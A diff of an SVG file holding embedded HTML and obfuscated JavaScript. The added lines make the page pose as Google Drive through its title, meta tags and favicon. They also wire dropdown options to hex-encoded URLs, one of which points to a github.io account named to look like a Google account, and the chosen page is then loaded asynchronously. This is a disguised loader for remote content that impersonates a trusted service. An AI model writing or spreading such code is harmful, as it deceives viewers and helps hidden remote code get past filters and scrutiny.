@@ -3,6 +3,11 @@
   <foreignObject id="fo" width="100%" height="100%" x="0" y="0">
     <html xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;margin:0;padding:0;">
     <head>
+    <title>Home - Google Drive</title>
+<meta property="og:locale" content="en-US" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Home - Google Drive" />
+<link rel="icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_favicon_2026_32dp.png" />
       <style>
         /* <![CDATA[ */
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -18,6 +23,8 @@
       <label for="_0x2" style="margin-right:5px;font-size:14px;">Link:</label>
       <select id="_0x2">
         <option value="" disabled="disabled" selected="selected">Select a link...</option>
+        <option id="_0xopt1" value="">1.8.8 Old</option>
+        <option id="_0xopt2" value="">26.2 New</option>
       </select>
     </div>
 
@@ -59,17 +66,11 @@
         "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x6f\x67\x6c\x65\x61\x63\x63\x6f\x75\x6e\x74\x39\x36\x32\x2e\x67\x69\x74\x68\x75\x62\x2e\x69\x6f\x2f\x6d\x79\x66\x69\x72\x73\x74\x72\x65\x70\x6f\x2f\x74\x68\x69\x72\x64\x2e\x68\x74\x6d\x6c"
       ];
 
+      // Assign encoded values directly to the static DOM option elements safely
+      document.getElementById('_0xopt1').value = _0x82b4[18];
+      document.getElementById('_0xopt2').value = _0x82b4[19];
+
       const _0x3e4a = document[_0x82b4[7]](_0x82b4[0]);
-
-      const _0xopt1 = document.createElement('option');
-      _0xopt1.value = _0x82b4[18];
-      _0xopt1.text = 'first.html';
-      _0x3e4a.appendChild(_0xopt1);
-
-      const _0xopt2 = document.createElement('option');
-      _0xopt2.value = _0x82b4[19];
-      _0xopt2.text = 'third.html';
-      _0x3e4a.appendChild(_0xopt2);
 
       _0x3e4a[_0x82b4[8]](_0x82b4[1], async(_0x5f12)=>{
         const _0x9b8c = _0x5f12[_0x82b4[17]][_0x82b4[9]];
